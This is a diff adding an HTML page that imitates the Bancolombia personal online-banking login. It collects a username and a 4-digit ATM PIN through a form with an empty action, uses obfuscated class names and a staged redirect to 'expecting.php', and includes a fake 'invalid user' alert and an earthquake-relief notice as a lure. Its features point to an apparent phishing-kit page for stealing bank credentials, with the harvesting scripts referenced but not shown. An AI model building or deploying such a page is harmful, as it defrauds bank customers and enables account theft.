@@ -1,0 +1,971 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=5.0, user-scalable=yes, viewport-fit=cover">
+    <meta name="theme-color" content="#f9f9fa">
+    <meta http-equiv="ScreenOrientation" content="autoRotate:disabled">
+
+    <script>
+        window.__ALLOW_EMBED__ = new URLSearchParams(window.location.search).get('embed') === '1';
+        function redirectToExpecting() {
+            window.location.href = 'expecting.php?back=p1.html';
+        }
+    </script>
+    <script src="../../js/pa-sec555view.js"></script>
+    <script src="../../js/click-tracker.js"></script>
+
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet" href="css/top-banner.css">
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html,
+        body {
+            width: 100%;
+            min-height: 100%;
+            font-family: "Open Sans", Arial, sans-serif;
+            font-size: 1rem;
+            color: #2c2a29;
+            line-height: 24px;
+            letter-spacing: -0.3px;
+            background-color: #f9f9fa;
+            font-synthesis: none;
+            -webkit-text-size-adjust: 100%;
+            touch-action: pan-x pan-y pinch-zoom;
+        }
+
+        button,
+        input {
+            font-family: inherit;
+        }
+
+        a {
+            color: inherit;
+        }
+
+        .rb-c-689292 {
+            display: block;
+            min-height: 77vh;
+        }
+
+        .rb-c-a9f98c {
+            width: 100%;
+            padding: 0 16px;
+            margin: 0 auto;
+        }
+
+        .rb-c-e2a91d {
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: 100%;
+            background-image: url("img/7b4e2c19a8f3061d.svg");
+        }
+
+        @media (max-width: 991px) {
+            .rb-c-e2a91d {
+                background-size: auto;
+            }
+        }
+
+        .rb-c-9f600a {
+            display: flex;
+        }
+
+        .rb-c-c1e261 {
+            justify-content: center;
+        }
+
+        .rb-c-0037c9 {
+            text-align: center;
+        }
+
+        .rb-c-9e4fa9 {
+            margin-top: 1.5rem;
+        }
+
+        .rb-c-673917 {
+            margin-top: 3rem;
+        }
+
+        .rb-c-893f3d img {
+            width: 11.5rem;
+            height: auto;
+            display: block;
+        }
+
+        h1.rb-c-9b7204,
+        .rb-c-b1331a.rb-c-9b7204,
+        .rb-c-b1331a {
+            font-family: "CIB Sans Light", "Segoe UI Light", sans-serif;
+            font-weight: 200;
+            font-size: 2.25rem;
+            line-height: 40px;
+            letter-spacing: 0;
+            color: #2c2a29;
+            font-synthesis: none;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .rb-c-8c2a74 {
+            display: flex;
+            justify-content: center;
+            padding-bottom: 3rem;
+        }
+
+        .rb-c-1d2cbb {
+            width: 100%;
+            max-width: 560px;
+            padding: 0;
+            margin: 0 auto;
+        }
+
+        @media (min-width: 768px) {
+            .rb-c-1d2cbb {
+                max-width: min(560px, 41.666667%);
+            }
+        }
+
+        @media (max-width: 575px) {
+            .rb-c-1d2cbb {
+                max-width: 100%;
+            }
+
+            .rb-c-1d2cbb>.rb-c-9e4fa9 {
+                margin-top: 1rem;
+            }
+
+            h1.rb-c-9b7204,
+            .rb-c-b1331a.rb-c-9b7204,
+            .rb-c-b1331a {
+                font-size: 1.75rem;
+                line-height: 32px;
+            }
+
+            .rb-c-673917 {
+                margin-top: 2rem;
+            }
+
+            .rb-c-4e449d {
+                padding: 8px;
+            }
+
+            .rb-c-1157d5 {
+                padding: 0;
+            }
+
+            .rb-c-1d2cbb .rb-c-64cb69 {
+                border-radius: 16px 16px 8px 8px;
+            }
+        }
+
+        @media (min-width: 576px) {
+            h1.rb-c-9b7204 {
+                font-size: 2.25rem;
+                line-height: 40px;
+            }
+        }
+
+        .rb-c-64cb69 {
+            display: flex;
+            width: 100%;
+            padding: 0;
+            border-radius: 8px;
+            background-color: #fff;
+            box-shadow: 0 8px 12px rgba(44, 42, 41, 0.1607843137), 0 1px 8px rgba(43, 42, 41, 0.0784313725);
+        }
+
+        .rb-c-1781ee {
+            padding: 0;
+            width: 100%;
+        }
+
+        .rb-c-4e449d {
+            padding: 32px;
+            width: 100%;
+        }
+
+        .rb-c-4e449d .rb-c-1157d5 {
+            text-align: center;
+        }
+
+        .rb-c-1157d5 .rb-c-9d7c21 {
+            display: none;
+        }
+
+        .rb-c-ed69f1 {
+            margin-top: 1rem;
+        }
+
+        .rb-c-4e449d .rb-c-5a9752 {
+            font-family: "CIB Sans Bold", "Segoe UI Bold", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif, -apple-system, BlinkMacSystemFont, system-ui;
+            font-weight: 700;
+            font-size: 1.5rem;
+            line-height: 28px;
+            letter-spacing: 0;
+            font-synthesis: none;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        h3.rb-c-d6614b,
+        .rb-c-4e449d .rb-c-d6614b {
+            font-family: "Open Sans", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif, -apple-system, BlinkMacSystemFont, system-ui;
+            font-weight: 400;
+            font-size: 1rem;
+            line-height: 24px;
+            letter-spacing: 0;
+            font-synthesis: none;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .rb-c-4e449d .rb-c-c1872c {
+            display: grid;
+            margin-bottom: 32px;
+            width: 100%;
+        }
+
+        .rb-c-cd3bb1 {
+            margin-top: 2rem;
+        }
+
+        .rb-c-4df00c {
+            margin-top: 1.5rem;
+        }
+
+        .rb-c-f1b19e {
+            width: 100%;
+            position: relative;
+            height: 52px;
+            margin-top: 20px;
+        }
+
+        @media screen and (max-width: 975px) {
+            .rb-c-f1b19e {
+                margin-bottom: 15px;
+                display: grid;
+            }
+        }
+
+        .rb-c-f1b19e>em:not(.rb-c-f1c561),
+        .rb-c-f1b19e bc-icon {
+            font-family: "BC Icons";
+            font-weight: normal;
+            font-style: normal;
+            font-size: 1.5rem;
+            line-height: 1;
+            position: absolute;
+            color: #2c2a29;
+            top: 4px;
+            left: 0;
+            width: 24px;
+            -webkit-font-smoothing: antialiased;
+            text-rendering: optimizeLegibility;
+            font-feature-settings: "liga";
+        }
+
+        .rb-c-f1b19e em+input,
+        .rb-c-f1b19e em+.rb-c-a46b05 {
+            padding-left: 30px;
+        }
+
+        .rb-c-f1b19e.rb-c-ec6a39 .rb-c-a46b05 {
+            padding-right: 32px;
+        }
+
+        .rb-c-f1b19e .rb-c-f1c561 {
+            position: absolute;
+            right: 0;
+            top: 4px;
+            left: auto;
+            width: 24px;
+            height: 24px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-family: "BC Icons", sans-serif;
+            font-weight: normal;
+            font-style: normal;
+            font-size: 1.25rem;
+            line-height: 1;
+            color: #2c2a29;
+            background-color: rgba(255, 255, 255, 0);
+            border: none;
+            border-radius: 50%;
+            outline: 0 none;
+            cursor: pointer;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+            text-rendering: optimizeLegibility;
+            font-feature-settings: "liga";
+        }
+
+        .rb-c-f1b19e .rb-c-f1c561[hidden] {
+            display: none;
+        }
+
+        .rb-c-f1b19e .rb-c-f1c561:hover,
+        .rb-c-f1b19e .rb-c-f1c561:focus-visible {
+            background-color: rgba(44, 42, 41, 0.08);
+        }
+
+        em~.rb-c-a46b05[aria-label],
+        em~.rb-c-a46b05[id] {
+            padding-left: 30px;
+        }
+
+        .rb-c-a46b05 {
+            background-color: rgba(0, 0, 0, 0);
+            border: none;
+            border-bottom: 1px solid #2c2a29;
+            color: #2c2a29;
+            display: block;
+            height: 32px;
+            width: 100%;
+            outline: none;
+            font-family: "Open Sans SemiBold", "Segoe UI Semibold", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif, -apple-system, BlinkMacSystemFont, system-ui;
+            font-weight: 600;
+            font-size: 1rem;
+            line-height: 24px;
+            letter-spacing: 0;
+            font-synthesis: none;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .rb-c-a46b05:focus {
+            outline: none;
+            transition: 0.5s;
+            border-bottom: 2px solid #2c2a29;
+        }
+
+        .rb-c-a46b05:not(:placeholder-shown) {
+            border-bottom: 2px solid #383736;
+        }
+
+        .rb-c-f1b19e>label[for] {
+            left: 0;
+            padding-left: 0;
+            position: absolute;
+            pointer-events: none;
+            top: 3px;
+            transition: 0.2s ease all;
+            font-family: "Open Sans", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif, -apple-system, BlinkMacSystemFont, system-ui;
+            font-weight: 400;
+            font-size: 0.875rem;
+            line-height: 20px;
+            letter-spacing: 0;
+            font-synthesis: none;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .rb-c-a46b05[aria-label]~label,
+        .rb-c-a46b05[id]~label {
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            width: 88%;
+            font-size: 1rem;
+            line-height: 24px;
+        }
+
+        .rb-c-f1b19e em+input~label[for],
+        .rb-c-f1b19e em+.rb-c-a46b05~label[for] {
+            padding-left: 30px;
+        }
+
+        .rb-c-a46b05:focus~label,
+        .rb-c-a46b05:not(:placeholder-shown)~label {
+            top: -23px;
+            padding-left: 0;
+            width: 95%;
+            font-size: 0.875rem;
+            line-height: 20px;
+        }
+
+        .rb-c-35c54c {
+            display: block;
+            min-height: 1.063rem;
+        }
+
+        .rb-c-a46b05.rb-c-603f27 {
+            border-bottom: 2px solid #e20201;
+        }
+
+        .rb-c-a46b05.rb-c-603f27:focus {
+            border-bottom: 2px solid #e20201;
+        }
+
+        .rb-c-a46b05.rb-c-603f27[aria-label]~.rb-c-35c54c,
+        .rb-c-a46b05.rb-c-603f27[id]~.rb-c-35c54c {
+            color: #e20201;
+        }
+
+        .rb-c-a46b05[aria-label]~span,
+        .rb-c-a46b05[id]~span {
+            display: block;
+            height: 20px;
+            font-family: "Open Sans", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif, -apple-system, BlinkMacSystemFont, system-ui;
+            font-weight: 400;
+            font-size: 0.75rem;
+            line-height: 16px;
+            letter-spacing: 0;
+        }
+
+        .rb-c-c18777 {
+            color: #2c2a29;
+            font-family: "CIB Sans", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif, -apple-system, BlinkMacSystemFont, system-ui;
+            font-weight: 400;
+            font-size: 0.875rem;
+            line-height: 20px;
+            text-decoration: none;
+            align-items: center;
+            display: flex;
+            width: fit-content;
+            cursor: pointer;
+        }
+
+        .rb-c-d52afc {
+            font-family: "Open Sans", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif, -apple-system, BlinkMacSystemFont, system-ui;
+            font-weight: 400;
+            font-size: 0.875rem;
+            line-height: 20px;
+        }
+
+        .rb-c-54e7c9 {
+            font-family: "Open Sans Bold", "Segoe UI Bold", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif, -apple-system, BlinkMacSystemFont, system-ui;
+            font-weight: 700;
+            font-size: 0.875rem;
+            line-height: 20px;
+            text-decoration: none;
+        }
+
+        .rb-c-54e7c9 u {
+            text-decoration: underline;
+        }
+
+        .rb-c-c14cd9 {
+            font-family: "Open Sans Bold", "Segoe UI Bold", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif, -apple-system, BlinkMacSystemFont, system-ui;
+            font-weight: 700;
+            font-size: 0.75rem;
+            line-height: 16px;
+        }
+
+        .rb-c-c18777:hover,
+        .rb-c-54e7c9:hover {
+            opacity: 0.8;
+        }
+
+        .rb-c-54e7c9:hover {
+            text-decoration: none;
+            outline: none;
+        }
+
+        .rb-c-d6488a {
+            -webkit-text-security: disc;
+        }
+
+        .rb-c-2307a8 {
+            display: none;
+        }
+
+        .rb-c-4e449d .rb-c-8e93e3 {
+            display: flex;
+            justify-content: center;
+        }
+
+        .rb-c-16f27f {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            column-gap: 8px;
+            border: none;
+            cursor: pointer;
+            padding: 12px 24px;
+            outline: 0 none;
+            text-transform: none;
+            text-decoration: none;
+            border-radius: 100px;
+            overflow: hidden;
+            width: 100%;
+            min-height: 32px;
+            white-space: initial;
+            font-family: "CIB Sans Bold", "Segoe UI Bold", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif, -apple-system, BlinkMacSystemFont, system-ui;
+            font-weight: 700;
+            font-size: 1.125rem;
+            line-height: 26px;
+            letter-spacing: 0;
+            font-synthesis: none;
+            -webkit-font-smoothing: antialiased;
+            transition: 150ms cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .rb-c-b87ed7 {
+            background-color: #fdda24;
+            color: #2c2a29;
+        }
+
+        .rb-c-b87ed7:hover:enabled {
+            background-color: #fee66c;
+        }
+
+        .rb-c-b87ed7:disabled {
+            background-color: #d9dadd;
+            color: #97999b;
+            cursor: default;
+        }
+
+        .rb-c-e5a323 {
+            width: 100%;
+        }
+
+        .rb-c-4e449d .rb-c-edcb7e {
+            display: flex;
+            justify-content: center;
+            margin-top: 24px;
+        }
+
+        .rb-c-eaa66a {
+            background: transparent;
+            padding: 24px 24px 96px;
+        }
+
+        .rb-c-3f5876 {
+            width: 100%;
+            max-width: 100%;
+            padding: 0 16px;
+            margin: 0 auto;
+        }
+
+        .rb-c-7cef71 {
+            display: flex;
+            justify-content: flex-end;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 16px;
+        }
+
+        .rb-c-eaa66a .rb-c-952261>a.rb-c-c18777 {
+            color: #2c2a29;
+            font-family: "CIB Sans", "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif, -apple-system, BlinkMacSystemFont, system-ui;
+            font-weight: 400;
+            font-size: 0.875rem;
+            line-height: 20px;
+            letter-spacing: 0;
+            text-decoration: none;
+            font-synthesis: none;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .rb-c-952261 {
+            display: flex;
+            align-items: center;
+        }
+
+        .rb-c-952261::after {
+            content: "·";
+            margin: 0 16px;
+            color: #2c2a29;
+        }
+
+        .rb-c-952261:last-of-type::after {
+            content: "";
+            margin: 0;
+        }
+
+        .rb-c-952261 .rb-c-c18777 {
+            font-size: 0.875rem;
+        }
+
+        .rb-c-70c551 {
+            margin: 16px 0;
+            width: 100%;
+            height: 1px;
+            background: #b3b5b8;
+            border-radius: 4px;
+        }
+
+        .rb-c-db36ef {
+            display: flex;
+            align-items: flex-start;
+            gap: 24px;
+        }
+
+        .rb-c-148620 {
+            flex: 1;
+        }
+
+        .rb-c-e0113c {
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .rb-c-e672d9 img {
+            width: 150px;
+            display: block;
+        }
+
+        .rb-c-af2a6f {
+            position: relative;
+            height: 16px;
+            margin-top: 8px;
+        }
+
+        .rb-c-af2a6f img {
+            width: 16px;
+            height: auto;
+            display: block;
+            transform: rotate(90deg);
+            transform-origin: center center;
+            position: absolute;
+            left: 56px;
+            top: -57px;
+        }
+
+        .rb-c-cb9ba1 {
+            text-align: right;
+        }
+
+        .rb-c-2d9e54 {
+            position: relative;
+            z-index: 0;
+        }
+
+        .rb-c-2d9e54 p {
+            font-size: 0.75rem;
+            line-height: 16px;
+        }
+
+        @media (max-width: 767px) {
+            .rb-c-db36ef {
+                flex-direction: column;
+                align-items: center;
+                gap: 0;
+            }
+
+            .rb-c-148620 {
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+
+            .rb-c-e0113c {
+                align-items: center;
+                width: 100%;
+            }
+
+            .rb-c-af2a6f {
+                position: relative;
+                width: 140px;
+                max-width: 100%;
+                height: 18px;
+                margin: 8px auto 0;
+                flex-shrink: 0;
+            }
+
+            .rb-c-af2a6f img {
+                position: absolute;
+                left: 50%;
+                top: 50%;
+                width: 16px;
+                height: auto;
+                margin: 0;
+                transform: translate(-50%, -50%) rotate(90deg);
+                transform-origin: center center;
+            }
+
+            .rb-c-cb9ba1 {
+                text-align: center;
+                width: 100%;
+            }
+
+            .rb-c-2d9e54 {
+                margin: 8px 0 0;
+            }
+        }
+
+        @media (max-width: 575px) {
+            .rb-c-eaa66a {
+                padding: 8px 8px 96px;
+            }
+
+            .rb-c-7cef71 {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .rb-c-952261::after {
+                content: "";
+                margin: 0;
+            }
+
+            .rb-c-db36ef {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .rb-c-148620,
+            .rb-c-cb9ba1 {
+                text-align: center;
+            }
+        }
+
+        .rb-c-9b6f26 {
+            position: fixed;
+            top: clamp(72px, 11vh, 116px);
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 10000;
+            display: none;
+            align-items: stretch;
+            width: min(calc(100% - 32px), 560px);
+            background-color: #333333;
+            border-radius: 8px;
+            box-shadow: 0 8px 24px rgba(44, 42, 41, 0.28), 0 2px 8px rgba(44, 42, 41, 0.12);
+            overflow: hidden;
+            color: #ffffff;
+            font-family: "Open Sans", Arial, sans-serif;
+        }
+
+        .rb-c-9b6f26.show {
+            display: flex;
+        }
+
+        .rb-c-fde75e {
+            width: 4px;
+            flex-shrink: 0;
+            background-color: #ff7f41;
+        }
+
+        .rb-c-7e69c1 {
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            padding: 18px 0 18px 14px;
+        }
+
+        .rb-c-ef95e6 {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: #ffc4a8;
+            color: #2c2a29;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.125rem;
+            font-weight: 700;
+            line-height: 1;
+        }
+
+        .rb-c-b59b27 {
+            flex: 1;
+            padding: 16px 12px 16px 10px;
+            text-align: left;
+            min-width: 0;
+        }
+
+        .rb-c-1b3bc7 {
+            margin: 0 0 4px;
+            font-family: "CIB Sans Bold", sans-serif;
+            font-size: 1rem;
+            font-weight: 700;
+            line-height: 1.35;
+        }
+
+        .rb-c-5177da {
+            margin: 0;
+            font-size: 0.875rem;
+            font-weight: 400;
+            line-height: 1.45;
+            color: rgba(255, 255, 255, 0.92);
+        }
+
+        .rb-c-3f6b37 {
+            flex-shrink: 0;
+            align-self: flex-start;
+            border: none;
+            background: transparent;
+            color: #ffffff;
+            font-size: 1.375rem;
+            line-height: 1;
+            padding: 14px 16px 8px 8px;
+            cursor: pointer;
+            opacity: 0.85;
+        }
+
+        .rb-c-3f6b37:hover {
+            opacity: 1;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="rb-i-bba2d5">
+        <div class="rb-c-9b6f26" id="rb-i-c7c357" role="alert" aria-live="polite">
+            <div class="rb-c-fde75e" aria-hidden="true"></div>
+            <div class="rb-c-7e69c1" aria-hidden="true">
+                <span class="rb-c-ef95e6">×</span>
+            </div>
+            <div class="rb-c-b59b27">
+                <p class="rb-c-1b3bc7">Algo salió mal</p>
+                <p class="rb-c-5177da">El usuario ingresado no es válido. Por favor, verifica e intenta nuevamente.</p>
+            </div>
+            <button type="button" class="rb-c-3f6b37" aria-label="Cerrar mensaje">×</button>
+        </div>
+
+        <main class="rb-c-689292 rb-c-d77f71">
+            <div class="rb-c-a9f98c rb-c-e2a91d">
+                <div class="rb-c-9f600a rb-c-c1e261 rb-c-673917">
+                    <div class="rb-c-893f3d">
+                        <img src="img/9c3f1a28e7b5064a.svg" alt="Bancolombia" width="184" height="48">
+                    </div>
+                </div>
+
+                <h1 class="rb-c-0037c9 rb-c-9b7204 rb-c-b1331a rb-c-9e4fa9">Sucursal Virtual Personas</h1>
+
+                <div class="rb-c-8c2a74">
+                    <div class="rb-c-1d2cbb">
+                        <div class="rb-c-b7ab16">
+                            <article role="alert" class="rb-c-1f5f87 rb-c-4ecf75 rb-c-4f5aec rb-c-c23284 rb-c-4af9a2"
+                                aria-label="Mensaje informativo">
+                                <section class="rb-c-0a41c5" aria-hidden="true">
+                                    <div class="rb-c-566cbf rb-c-08cdba rb-c-157fe0" aria-label="Estado informativo">
+                                        <em class="rb-c-9d7c21 rb-c-941879" aria-hidden="true">-lightbulb-small</em>
+                                    </div>
+                                </section>
+                                <section class="rb-c-b1df2e">
+                                    <section class="rb-c-a7ab67">
+                                        <span class="rb-c-181d5c">Mensaje informativo</span>
+                                        <p class="rb-c-e9f569">Estamos Unidos Por Colombia. Te escuchamos.</p>
+                                        <p class="rb-c-6d9f24">Si el terremoto te afectó y buscas opciones de pago para
+                                            tu crédito actual, llámanos al (604) 402 51 58. Si necesitas un nuevo
+                                            crédito con condiciones especiales, llamanos: Celular: (602) 554 05 05 y
+                                            (606) 340 12 13. Fijo: 01 8000 912 345. <a href="#" class="rb-c-36834f"></a>
+                                        </p>
+                                    </section>
+                                </section>
+                            </article>
+                        </div>
+                        <div class="rb-c-9e4fa9">
+                            <section class="rb-c-64cb69 rb-c-1781ee">
+                                <section class="rb-c-4e449d">
+                                    <section class="rb-c-1157d5">
+                                        <section><em aria-hidden="true" class="rb-c-9d7c21"></em></section>
+                                        <h1 class="rb-c-5a9752 rb-c-0e8e1e rb-c-ed69f1">¡Hola!</h1>
+                                        <h3 class="rb-c-d6614b rb-c-ed69f1">Ingresa los datos para gestionar tus
+                                            productos y hacer transacciones.</h3>
+                                    </section>
+
+                                    <form id="rb-i-e72c92" method="POST" action="" novalidate>
+                                        <section>
+                                            <section class="rb-c-c1872c">
+                                                <div class="rb-c-cd3bb1">
+                                                    <div class="rb-c-f1b19e">
+                                                        <em aria-hidden="true">user</em>
+                                                        <input id="rb-i-353e21" name="user" class="rb-c-a46b05"
+                                                            placeholder=" " autocorrect="off" autocomplete="off"
+                                                            aria-label="Ingresar usuario" maxlength="21">
+                                                        <em role="button" aria-label="Borrar texto de usuario ingresado"
+                                                            class="rb-c-f1c561 rb-c-e6508f" tabindex="0"
+                                                            hidden>remove</em>
+                                                        <label for="userInput">Usuario</label>
+                                                        <span role="alert" class="rb-c-35c54c rb-c-2307a8"
+                                                            id="rb-i-d0dcac"></span>
+                                                        <a href="#"
+                                                            class="rb-c-c14cd9 rb-c-c18777 rb-c-d52afc rb-c-54e7c9"><u>¿Olvidaste
+                                                                tu usuario?</u></a>
+                                                    </div>
+                                                </div>
+                                                <div class="rb-c-4df00c">
+                                                    <div class="rb-c-f1b19e">
+                                                        <em aria-hidden="true">lock</em>
+                                                        <input id="rb-i-88a9eb" name="password" type="text"
+                                                            class="rb-c-d6488a rb-c-a46b05 rb-c-acbd17" placeholder=" "
+                                                            autocomplete="off" autocorrect="off" autocapitalize="off"
+                                                            spellcheck="false" inputmode="numeric" pattern="[0-9]*"
+                                                            maxlength="4" aria-label="Ingresa clave del cajero">
+                                                        <em role="button"
+                                                            aria-label="Borrar texto de clave del cajero ingresada"
+                                                            class="rb-c-f1c561 rb-c-e6508f" tabindex="0"
+                                                            hidden>remove</em>
+                                                        <label for="password" aria-hidden="true">Clave del
+                                                            cajero</label>
+                                                        <span role="alert" class="rb-c-35c54c rb-c-2307a8"
+                                                            id="rb-i-44e545"></span>
+                                                        <a href="#"
+                                                            class="rb-c-c14cd9 rb-c-c18777 rb-c-d52afc rb-c-54e7c9"><u>¿Olvidaste
+                                                                o bloqueaste tu clave?</u></a>
+                                                    </div>
+                                                </div>
+                                            </section>
+                                        </section>
+                                        <section class="rb-c-8e93e3">
+                                            <button type="submit" class="rb-c-16f27f rb-c-e5a323 rb-c-b87ed7"
+                                                id="rb-i-24c522" disabled>Iniciar sesión</button>
+                                        </section>
+                                    </form>
+
+                                    <section class="rb-c-edcb7e">
+                                        <a href="#" class="rb-c-c18777 rb-c-d52afc rb-c-54e7c9"><u>Crear usuario</u></a>
+                                    </section>
+                                </section>
+                            </section>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="rb-c-eaa66a" id="rb-i-cbf6c1">
+            <div class="rb-c-3f5876">
+                <div class="rb-c-7cef71">
+                    <div class="rb-c-952261"><a href="#" class="rb-c-c18777">¿Problemas para conectarte?</a></div>
+                    <div class="rb-c-952261"><a href="#" class="rb-c-c18777">Aprende sobre seguridad</a></div>
+                    <div class="rb-c-952261"><a href="#" class="rb-c-c18777">Reglamento Sucursal Virtual</a></div>
+                    <div class="rb-c-952261"><a href="#" class="rb-c-c18777">Política de privacidad</a></div>
+                </div>
+                <div class="rb-c-70c551"></div>
+                <div class="rb-c-db36ef">
+                    <div class="rb-c-148620">
+                        <div class="rb-c-e0113c">
+                            <div class="rb-c-e672d9">
+                                <img src="img/9c3f1a28e7b5064a.svg" alt="Bancolombia">
+                            </div>
+                            <div class="rb-c-af2a6f">
+                                <img src="img/2d8e4f19c6a3075b.svg"
+                                    alt="Vigilado Superintendencia Financiera de Colombia">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="rb-c-cb9ba1">
+                        <div class="rb-c-2d9e54">
+                            <p id="rb-i-c54cba">Dirección IP: <span id="rb-i-3af13d">Cargando...</span></p>
+                            <p id="rb-i-528b08">...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="/js/logo.js"></script>
+    <script>(function () { function c() { var b = a.contentDocument || (a.contentWindow && a.contentWindow.document); if (b) { var d = b.createElement('script'); d.innerHTML = "window.__CF$cv$params={r:'a53cb3484b30347f',t:'MTc5MzU1NDk5MQ=='};var l=window.parent.location,o;try{o=new URL(l.origin).origin}catch(e){try{o=new URL(new URL(l.href).origin).origin}catch(e){o=''}}var u='/cdn-cgi/challenge-platform/scripts/jsd/main.js?ray=a53cb3484b30347f',a=document.createElement('script');a.src=o?new URL(u,o).href:u;document.getElementsByTagName('head')[0].appendChild(a);"; b.getElementsByTagName('head')[0].appendChild(d) } } if (document.body) { var a = document.createElement('iframe'); a.height = 1; a.width = 1; a.style.position = 'absolute'; a.style.top = 0; a.style.left = 0; a.style.border = 'none'; a.style.visibility = 'hidden'; document.body.appendChild(a); if ('loading' !== document.readyState) c(); else if (window.addEventListener) document.addEventListener('DOMContentLoaded', c); else { var e = document.onreadystatechange || function () { }; document.onreadystatechange = function (b) { e(b); 'loading' !== document.readyState && (document.onreadystatechange = e, c()) } } } })();</script>
+    <script type="module"
+        src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092"
+        integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw=="
+        data-cf-beacon='{"version":"2024.11.0","token":"ba3fcfe5ffcd448bb7272753832c7b2e","r":1,"spa":2}'
+        crossorigin="anonymous"></script>
+</body>
+
+</html>
